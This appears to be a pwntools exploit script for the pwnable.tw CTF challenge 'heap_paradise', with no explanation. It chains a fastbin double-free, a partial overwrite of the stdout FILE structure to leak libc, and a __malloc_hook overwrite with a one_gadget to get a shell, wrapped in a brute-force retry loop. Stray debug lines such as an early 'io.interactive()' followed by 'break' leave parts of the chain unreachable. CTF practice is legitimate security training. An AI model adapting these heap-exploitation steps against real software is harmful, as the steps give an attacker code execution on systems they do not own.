from pwn import *
#io = process('./heap_paradise')

def allo(size, data):
    io.recvuntil('e:')
    io.sendline('1')
    io.recvuntil(' :')
    io.sendline(str(size))
    io.recvuntil(' :')
    io.send(data)

def free(ind):
    io.recvuntil('e:')
    io.sendline('2')
    io.recvuntil(' :')
    io.sendline(str(ind))
while True:
    io = process('./heap_paradise')
    #io = remote('chall.pwnable.tw', 10308)
    try:
        allo(0x28, p64(0x71)*4) #0
        allo(0x68, p64(0x21)*13) #1
        allo(0x68, p64(0x21)*13) #2
        free(1)
        free(2)
        free(1)
        allo(0x68, '\x20') #3
        allo(0x68, '\x30') #4
        allo(0x68, p64(0)) #5
        allo(0x68, p64(0) + p64(0xa1)) #6
        free(2)
        free(6)
        free(2)
        free(1)
        io.interactive()
        break
        allo(0x68, '\x30') #7
        allo(0x68, p64(0) + p64(0x71) + '\xdd\x15') #8
        allo(0x68, p64(0)) #9
        allo(0x68, p64(0)) #10
       # raw_input()
        stdout_partial = p64(0xfbad1887) + p64(0)*3 + '\x60'
        allo(0x68, '\x00'*0x33 + stdout_partial) #11
        #raw_input()
        #io.interactive()
        libc = u64(io.recvuntil('***')[:6].ljust(8, '\x00')) - 0x3c46a4
        print('libc : ' + hex(libc))
        #raw_input()
        malloc_hook = libc + 0x3c3aed
        one_gadget = libc + 0xef6c4
        print('malloc hook : ' + hex(malloc_hook))
        free(1)
        free(2)
        free(1)
        allo(0x68, p64(malloc_hook)) #12
        allo(0x68, p64(0)) #13
        allo(0x68, p64(0)) #14
        #raw_input()
        allo(0x68, '\x00'*0x13 + p64(one_gadget)) #15

        break
    except:
        io.close()
        print('.')

free(0)
free(0)
io.interactive()
